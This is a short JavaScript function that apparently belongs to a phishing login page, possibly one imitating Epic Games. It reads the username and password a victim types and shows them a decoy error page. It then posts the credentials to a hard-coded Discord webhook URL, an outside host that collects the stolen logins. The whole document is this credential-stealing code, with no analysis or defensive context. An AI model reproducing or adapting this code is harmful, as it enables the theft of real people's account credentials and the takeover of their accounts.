function runepic() {
  const user = document.getElementById('user').value;
  const pass = document.getElementById('pass').value;

  const webhookURL =
    'https://discord.com/api/webhooks/1319259063678271548/hDiin0VISOlQian1VnL43QfqI1dbx8Z-NtpRVqCLpIOROOQ_-_8xAjrf2Pg2t5LHN0Yb';
  
  const messageContent = {
    content: 'username: ' + user + '\npassword: ' + pass,
  };
  window.open("error.html").href
  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(messageContent),
  })
    .then((response) => response.json())
    .then((data) => console.log('Message sent:', data))
    .catch((error) => console.error('Error sending message:', error));
}
